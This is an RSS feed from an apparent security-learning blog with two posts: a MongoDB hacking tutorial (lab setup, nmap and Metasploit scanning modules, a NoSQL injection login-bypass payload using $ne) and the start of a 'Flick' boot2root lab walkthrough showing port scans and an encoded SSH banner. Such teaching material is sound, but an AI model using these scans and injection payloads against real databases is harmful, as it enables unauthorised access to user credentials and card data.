<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Open-Security</title>
    <description>Open-Security Resources.</description>
    <link></link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    
      <item>
        <title>Hacking_mongodb</title>
        <description>&lt;h1&gt;Mongodb Hacking&lt;/h1&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;1. Introduction and Lab Setup.
   1.1 What is MongoDB ?
   1.2 How about Security ?
   1.3 Installing MongoDB in Kali
   1.4 Playing with Mongo Shell
       1.4.1 Creating a database
       1.4.2 Checking current database
       1.4.3 Checking the list of databases
       1.4.4 Inserting data into collections
       1.4.5 Querying a document
       1.4.6 Writing Conditions while querying data
       1.4.7 Deleting Documents
       1.4.8 Dropping a collection
       1.4.9 Dropping a database
   1.5 Lab Setup

2. Vulnerability Assessment
   2.1 Introduction
   2.2 Scanning for open ports
   2.3 Service enumeration
   2.4 Scanning for http-interface
   2.5 Accessing HTTP Interface
   2.6 Scanning with nmap NSE scripts
   2.7 mongodb-brute
   2.8 mongodb-databases
   2.9 Metasploit Auxiliary Module
   2.10 Exploitation

3. Attacking Applications
   3.1 Introduction

4. Automated Assessments
   4.1 Getting NoSQLMap ready
   4.2 NoSQL DB Access Attacks
   4.3 Scanning for anonymous MongoDB access
   4.4 NoSQL Injection using NoSQLMao
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;hr&gt;

&lt;h2&gt;Introduction and Lab Setup&lt;/h2&gt;

&lt;h3&gt;What is Mongodb?&lt;/h3&gt;

&lt;p&gt;MongoDB is an open source schema less document oriented database system developed using C++. MongoDB is one of the leading NoSQL database solutions.  &lt;/p&gt;

&lt;p&gt;In MongoDB, data is stored in the form of JSON style document.  &lt;/p&gt;

&lt;p&gt;Some of the major features of MongoDB:  &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Document Based&lt;/li&gt;
&lt;li&gt;High performance&lt;/li&gt;
&lt;li&gt;HIgh Availability&lt;/li&gt;
&lt;li&gt;Easy Scalability&lt;/li&gt;
&lt;li&gt;No Complex Joins&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;How about Security?&lt;/h3&gt;

&lt;p&gt;With the growing use of NoSQL databases, security should be considered seriously. Just like any other system, the security of MongoDB is not a single-handed job. Everyone in the ecosystem is responsible for it. Even through MongoDB comes with some inbuilt security features, it is possible to have vulnerabilities in the production due to various reasons such as misconfigurations, no updates, poor programming etc.&lt;/p&gt;

&lt;h3&gt;Installing MongoDB in Kali&lt;/h3&gt;

&lt;p&gt;Run the sudo apt-get update command.  &lt;/p&gt;

&lt;p&gt;This command downloads the package lists from the repositories and updates them to get information on the newest version of the packages and their dependencies.&lt;/p&gt;

&lt;p&gt;This step may take some time and provides a large output on the screen, so the output is truncated.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# apt-get install mongodb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Create a directory &amp;ldquo;/data/db&amp;rdquo; under root folder. Make sure that &amp;ldquo;/data/db&amp;rdquo; is dieectly under the &amp;ldquo;/&amp;rdquo; root directory, we need to create this directory as root.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# mkdir -p /data/db
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once we have completed the previous steps, we can start  a MongoDB instance with the following command:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# service mongodb start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will start the MongoDB instance with the default features. After lanuching the MongoDB instance, we cross check to see if it is up and running by locking at the console messages.  &lt;/p&gt;

&lt;p&gt;If we see the message below in the console, it is running fine.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# service mongodb status
[ ok ] Checking status of database: mongodb running.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note: As mentioned earlier, MongoDB by default runs with limited features. For peneration testing lab purposes, use the following steps to start the MongoDB instance.  &lt;/p&gt;

&lt;p&gt;Launch MongoDB with the following command  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# mongod -httpinterface -reset -smallfiles
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;run the following command to connect to the mongod server, which is started already.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# mongo
MongoDB shell version: 2.0.6
connecting to: test
&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note: if you get any erros, please solve the problem yourself, and everything should work fine.  &lt;/p&gt;

&lt;hr&gt;

&lt;h3&gt;Playing with Mongo Shell&lt;/h3&gt;

&lt;p&gt;In the previous sections, we have seen a brief introduction to MongoDB and its setup. It&amp;rsquo;s time to play with the shell and execute few commands on the MongoDB to get better accquainted with MongoDB and its working.  &lt;/p&gt;

&lt;p&gt;MongoDB uses Javascript style queries and thus we feel like running Javascript code most of the time.  &lt;/p&gt;

&lt;p&gt;Though we don&amp;rsquo;t discuss all the commands associated with MongoDB, this section gives a brief idea of how MongoDB works.  &lt;/p&gt;

&lt;p&gt;Before we proceed, there are few terms to understand.  &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;MongoDB holds &amp;ldquo;databases&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Each database contains one or more &amp;ldquo;collections&amp;rdquo;.&lt;/li&gt;
&lt;li&gt;Each collection holds one or more &amp;ldquo;documents:.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now, let&amp;rsquo;s proceed to run the MongoDB commands&lt;/p&gt;

&lt;h4&gt;Creating a database&lt;/h4&gt;

&lt;p&gt;The following command will create a new database if doesn&amp;rsquo;t exist. If the database already exists, it uses it.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s create a database with the name &amp;quot;testdb&amp;rdquo;.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; show dbs
customers   (empty)
local   (empty)
sample  0.0625GB
shop    (empty)
test    (empty)
&amp;gt; use sample
switched to db sample
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Checking current database&lt;/h4&gt;

&lt;p&gt;We can use the command &amp;ldquo;db&amp;rdquo; to check the current database. Let;s run the command &amp;ldquo;db&amp;rdquo; to check the current database. &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db
sample
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Checking the list of databases&lt;/h4&gt;

&lt;p&gt;&amp;ldquo;show dbs&amp;rdquo; is the command to list the databases available.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; show dbs                                                
customers   (empty)                                       
local   (empty)                                           
sample  0.0625GB                                          
shop    (empty)                                           
test    (empty) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you notice the above output, it didn&amp;rsquo;t list the database we just created.  &lt;/p&gt;

&lt;p&gt;The reason is that it requires at least one document inside it.&lt;/p&gt;

&lt;h4&gt;Inserting data into collections&lt;/h4&gt;

&lt;p&gt;If we insert one or more documents inside it, we can see the database listed.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.insert({&amp;quot;username&amp;quot;:&amp;quot;superman&amp;quot;})
&amp;gt; db.demo.insert({&amp;quot;username&amp;quot;:&amp;quot;spiderman&amp;quot;})
&amp;gt; db.demo.insert({&amp;quot;username&amp;quot;:&amp;quot;flashman&amp;quot;})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;By default, we don&amp;rsquo;t need to explicitly create collections in a database (We can do so if we want). We can directly use a non-existent collection name to insert data. MongoDB will automaticallly create it.&lt;/p&gt;

&lt;p&gt;If we now list databases, we can see our current databases.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; show collections
demo
products
system.indexes
users
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Querying a document&lt;/h4&gt;

&lt;p&gt;In order to query data from a MongoDB collection, we can use find() method as shown below.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.find()
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69dda4b497930a32f3444&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;superman&amp;quot; }
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de14b497930a32f3445&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;spiderman&amp;quot; }
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de64b497930a32f3446&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;flashman&amp;quot; }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Writing Conditions while querying data&lt;/h4&gt;

&lt;p&gt;We can also write conditions on queries similar to RDBMS conditions with MongoDB specfic syntax.&lt;br&gt;
Currently, my collection has two documents.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.find()
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69dda4b497930a32f3444&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;superman&amp;quot; }
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de14b497930a32f3445&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;spiderman&amp;quot; }
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de64b497930a32f3446&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;flashman&amp;quot; }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If I want to retrieve only one document based on matching a specific username, we can do it as shown below. &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.find({&amp;quot;username&amp;quot;:&amp;quot;spiderman&amp;quot;})
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de14b497930a32f3445&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;spiderman&amp;quot; }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Deleting Documents&lt;/h4&gt;

&lt;p&gt;We can use remove() method to delete documents from a collection based on a specific condition.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.remove({&amp;quot;username&amp;quot;: &amp;quot;flashman&amp;quot;})
&amp;gt; db.demo.find()
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69dda4b497930a32f3444&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;superman&amp;quot; }
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de14b497930a32f3445&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;spiderman&amp;quot; }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The above query removes the document where the key &amp;ldquo;username&amp;rdquo; has the value &amp;ldquo;flashman&amp;rdquo;.&lt;/p&gt;

&lt;h4&gt;Dropping a collection&lt;/h4&gt;

&lt;p&gt;We can drop a collection as shown below.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.drop()
true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Droppong a database&lt;/h4&gt;

&lt;p&gt;We can drpo a database as shown below.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.dropDatabase()
{ &amp;quot;dropped&amp;quot; : &amp;quot;sample&amp;quot;, &amp;quot;ok&amp;quot; : 1 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The above command has dropped the database &amp;lsquo;sample&amp;rsquo; that we created.  &lt;/p&gt;

&lt;p&gt;This is how we can run commands on MongoDB using a mongo shell.  &lt;/p&gt;

&lt;p&gt;The idea behind showing these commands is not to make you a MongoDB master, but to give a basic idea of how MongoDB functions if you are an absolute beginner.&lt;/p&gt;

&lt;hr&gt;

&lt;h3&gt;Lab Setup&lt;/h3&gt;

&lt;p&gt;We need to have the following setup to follow the practical demonstrations shown in this book.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;             ----------------
             |              |
             |     Kali     |
             |              |
             |   [MongoDB]  |
             |              |
             ----------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As we can see in the above figure, we need to install Kali Linux. Make sure that you have &amp;ldquo;Host Only Adapter&amp;rdquo; under adapter 1 of your network settings for both the machines as shown below.&lt;/p&gt;

&lt;p&gt;Note: We will also setup a PHP Web Application later in this section. So, please use the same names as I am using to create database and collections. It is required for the PHP Web application to work. If you change these names, you may need to change the PHP web application accordingly.  &lt;/p&gt;

&lt;h4&gt;Create a new database&lt;/h4&gt;

&lt;p&gt;Get the mongo shell and create a new database called &amp;ldquo;sample&amp;rdquo; by running the following command in the mongo shell.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; use sample
switched to db sample
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This command will switch the user to the database &amp;ldquo;sample&amp;rdquo; if it already exists. If the database doesn&amp;rsquo;t exist, it will create a new one.&lt;/p&gt;

&lt;h4&gt;Insert data&lt;/h4&gt;

&lt;p&gt;Run the following command in mongo shell in order to insert test data into the collection &amp;ldquo;users&amp;rdquo;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.users.insert({&amp;quot;username&amp;quot;: &amp;quot;tom&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;tom&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;tom@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot;: 12345})
&amp;gt; db.users.insert({&amp;quot;username&amp;quot;: &amp;quot;jim&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;jim&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;jim@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot;: 54321})
&amp;gt; db.users.insert({&amp;quot;username&amp;quot;: &amp;quot;bob&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;bob&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;bob@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot;: 22222})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Similarly execute the following commands&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.products.insert({&amp;quot;email&amp;quot;: &amp;quot;tom@gmail.com&amp;quot;, &amp;quot;prodname&amp;quot;: &amp;quot;laptop&amp;quot;, &amp;quot;price&amp;quot;: &amp;quot;1500USC&amp;quot;})
&amp;gt; db.products.insert({&amp;quot;email&amp;quot;: &amp;quot;jim@gmail.com&amp;quot;, &amp;quot;prodname&amp;quot;: &amp;quot;book&amp;quot;, &amp;quot;price&amp;quot;: &amp;quot;50USC&amp;quot;})
&amp;gt; db.products.insert({&amp;quot;email&amp;quot;: &amp;quot;bob@gmail.com&amp;quot;, &amp;quot;prodname&amp;quot;: &amp;quot;diamondring&amp;quot;, &amp;quot;price&amp;quot;: &amp;quot;4500USC&amp;quot;})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Installing the PHP driver for mongo&lt;/h4&gt;

&lt;p&gt;In order for the PHP web application to work with MongoDB, we need to install the PHP driver.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;sudo apt-get install php-pear php5-dev
sudo pecl install mongo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Installing PHP Web application&lt;/h4&gt;

&lt;p&gt;Once after done with the installation of PHP driver, we need to install the PHP web application. Download the PHP code from HERE.  &lt;/p&gt;

&lt;p&gt;This files is named as mongo.zip and looks as shown below.  &lt;/p&gt;

&lt;hr&gt;

&lt;h2&gt;Vulnerability Assessment&lt;/h2&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;nmap -p 27017 &amp;lt;ipaddress&amp;gt;
nmap -p 27017 -sV &amp;lt;ipaddress&amp;gt;
nmap -p 27017 --script mongodb-brute &amp;lt;ipadress&amp;gt;
nmap -p 27017 --script mongodb-databases &amp;lt;ipaddress&amp;gt;

msf &amp;gt; use auxiliary/scanner/mongodb/mongodb_login
msf &amp;gt; use auxiliary/gather/mongodb_js_inject_collection_enum
msf &amp;gt; use exploit/linux/misc/mongod_native_helper

nmap -p 28017 &amp;lt;ipaddress&amp;gt;
nmap -p 28017 -sV &amp;lt;ipaddress&amp;gt;

http://&amp;lt;ipaddress&amp;gt;:28017/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;hr&gt;

&lt;h2&gt;Attacking Applications&lt;/h2&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.users.find({&amp;quot;username&amp;quot;:&amp;quot;jim&amp;quot;, &amp;quot;password&amp;quot;: {$ne: &amp;quot;0x00&amp;quot;}})
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d5d719d60515e316247247&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;jim&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;jim&amp;quot;, &amp;quot;email&amp;quot; : &amp;quot;jim@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot; : 54321 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you notice, the above MongoDB command is fetching all the documents where the username is &amp;ldquo;jim&amp;rdquo; and password not equals to &amp;ldquo;0x00&amp;rdquo;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.users.find({&amp;quot;username&amp;quot;: {$ne: &amp;quot;0x00&amp;quot;}, &amp;quot;password&amp;quot;: {$ne: &amp;quot;0x00&amp;quot;}})
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d5d6f2d60515e316247246&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;tom&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;tom&amp;quot;, &amp;quot;email&amp;quot; : &amp;quot;tom@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot; : 12345 }
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d5d719d60515e316247247&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;jim&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;jim&amp;quot;, &amp;quot;email&amp;quot; : &amp;quot;jim@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot; : 54321 }
{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d5d739d60515e316247248&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;bob&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;bob&amp;quot;, &amp;quot;email&amp;quot; : &amp;quot;bob@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot; : 22222 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This time, we are able to see all the documents that do not meet the condition username and password as &amp;ldquo;jim&amp;rdquo;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;http://localhost/index.php?username[$ne]=test&amp;amp;password[$ne]=test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;hr&gt;

&lt;h2&gt;Automated Assessments&lt;/h2&gt;

&lt;p&gt;We are going to use a very nice tool called NoSQLMap for this part.&lt;/p&gt;

&lt;p&gt;http://github.com/tcstool/nosqlmap&lt;/p&gt;
</description>
        <pubDate>Sun, 20 Sep 2015 00:00:00 +0000</pubDate>
        <link>/2015/09/20/hacking_mongodb/</link>
        <guid isPermaLink="true">/2015/09/20/hacking_mongodb/</guid>
      </item>
    
      <item>
        <title>Flick_1_workthrough</title>
        <description>&lt;h1&gt;Flick: 1&lt;/h1&gt;

&lt;hr&gt;

&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: Leonjza&lt;br&gt;
&lt;strong&gt;Links&lt;/strong&gt;: https://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/  &lt;/p&gt;

&lt;hr&gt;

&lt;h2&gt;Description&lt;/h2&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt; .o88o. oooo   o8o            oooo
 888 `&amp;quot; `888   `&amp;quot;&amp;#39;            `888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  `888  d88&amp;#39; `&amp;quot;Y8  888 .8P&amp;#39;
 888     888   888  888        888888.
 888     888   888  888   .o8  888 `88b.
o888o   o888o o888o `Y8bod8P&amp;#39; o888o o888o

Welcome to the flick boot2root!

- Where is the flag?
- What do you need to flick to find it?

Completing &amp;quot;flick&amp;quot; will require some sound
thinking, good enumeration skills &amp;amp; time! The
objective is to find and read the flag that
lives /root/

As a bonus, can you get root command execution?

Shoutout to @barrebas &amp;amp; @TheColonial for testing
it out first :)

$ sha1sum flick.ova
0e65f5a1f2b560d10115796c1adfb03548583db2  flick.ova

Good Luck!
@leonjza
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;hr&gt;

&lt;h2&gt;Workthrough&lt;/h2&gt;

&lt;p&gt;Scan flick lab for open port(s) with nmap.   &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ nmap -v -n -T4 -p- 192.168.10.42

Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-20 15:02 UTC
Initiating Ping Scan at 15:02
Scanning 192.168.10.42 [2 ports]
Completed Ping Scan at 15:02, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 15:02
Scanning 192.168.10.42 [65535 ports]
Discovered open port 22/tcp on 192.168.10.42
Discovered open port 8881/tcp on 192.168.10.42
Completed Connect Scan at 15:02, 4.25s elapsed (65535 total ports)
Nmap scan report for 192.168.10.42
Host is up (0.017s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8881/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.35 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Port: 22&lt;/h3&gt;

&lt;p&gt;Use ncat for ssh banner view.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ ncat -v 192.168.10.42 22
Ncat: Version 6.47 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.10.42:22.
SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1
^C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Connect to port 22, and check the log.  &lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;lab:pentestlab/ $ ssh -v root@192.168.10.42
OpenSSH_6.9p1, OpenSSL 1.0.2d 9 Jul 2015
...
debug1: kex: server-&amp;gt;client aes128-ctr umac-64@openssh.com none
debug1: kex: client-&amp;gt;server aes128-ctr umac-64@openssh.com none
debug1: sending SSH2_MSG_KEX_ECDH_INIT
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:OgFkTDTD/D7ndkanMRwJI92zYuzltDSkOS7E3sPlpPk
The authenticity of host &amp;#39;192.168.10.42 (192.168.10.42)&amp;#39; can&amp;#39;t be established.
ECDSA key fingerprint is SHA256:OgFkTDTD/D7ndkanMRwJI92zYuzltDSkOS7E3sPlpPk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &amp;#39;192.168.10.42&amp;#39; (ECDSA) to the list of known hosts.
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: Roaming not allowed by server
debug1: SSH2_MSG_SERVICE_REQUEST sent
debug1: SSH2_MSG_SERVICE_ACCEPT received

\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
